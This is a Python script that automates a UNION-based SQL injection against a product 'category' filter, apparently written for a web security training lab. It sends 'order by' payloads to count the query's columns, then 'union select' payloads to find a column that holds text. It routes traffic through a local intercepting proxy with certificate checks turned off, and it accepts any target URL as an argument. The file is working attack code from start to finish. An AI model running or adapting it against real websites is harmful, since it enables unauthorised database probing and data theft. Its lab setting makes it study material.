import requests
import sys
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit_sqli_column_num(url):
    path = 'filter?category=Gifts'
    for i in range(1, 50):
        sql_payload = f"'+order+by+{i}--"
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if 'Internal Server Error' in res:
            return i - 1
        i += 1
    return False

def exploit_sqli_string_field(url, num_col):
    path = 'filter?category=Gifts'
    for i in range(1, num_col + 1):
        string = "'YuUH06'"
        payload_list = ['NULL'] * num_col
        payload_list[i-1] = string
        sql_payload = "' union select " + ','.join(payload_list) + '--'
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        print(url+path+sql_payload)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)

    print('[+] Figuring out number of columns...')
    num_col = exploit_sqli_column_num(url)
    if num_col:
        print(f'[+] The number of columns is {str(num_col)}.')
        print('[+] Figuring out which columns contain text..')
        string_column = exploit_sqli_string_field(url, num_col)
        if string_column:
            print(f'Column {str(string_column)} contains text.')
        else:
            print('[-] Unable to find columns with a string data type.')
    else:
        print('[-] The SQLi attack was unsuccessful.')